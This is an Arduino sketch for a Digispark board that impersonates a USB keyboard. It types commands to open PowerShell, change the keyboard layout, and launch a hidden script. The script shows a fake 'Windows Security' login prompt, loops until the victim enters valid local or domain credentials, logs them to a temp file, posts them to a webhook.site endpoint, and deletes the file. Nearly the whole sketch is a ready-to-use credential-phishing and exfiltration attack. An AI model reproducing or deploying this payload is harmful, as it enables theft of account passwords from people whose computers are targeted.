
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {

  // Open PowerShell
   
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Set Layout to US
  
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Exploit (Add your code here)
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {Start-Sleep -s 60;Add-Type -assemblyname system.DirectoryServices.accountmanagement;$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);$domainDN = \"LDAP://\" + ([ADSI]"").distinguishedName;while($true){$credential = $host.ui.PromptForCredential(\"Windows Security\", \"Enter your credentials\", \"\", \"\");if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String]$pass = $creds.password;[String]$domain = $creds.domain;$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;out-file -InputObject $pastevalue -FilePath \"$env:temp\\rake\" -Append;$authlocal = $DS.ValidateCredentials($user, $pass);$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;break}}};Invoke-WebRequest -Uri https://webhook.site/<WebHookID> -Method POST -ContentType 'text/plain' -InFile \"$env:temp\\rake\";Remove-Item -Path \"$env:temp\\rake\"}")); //payload
  
  //turn on led when program finishes

  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH); 

  // Set Layout to DE

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-WinUserLanguageList -Force de-DE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
  

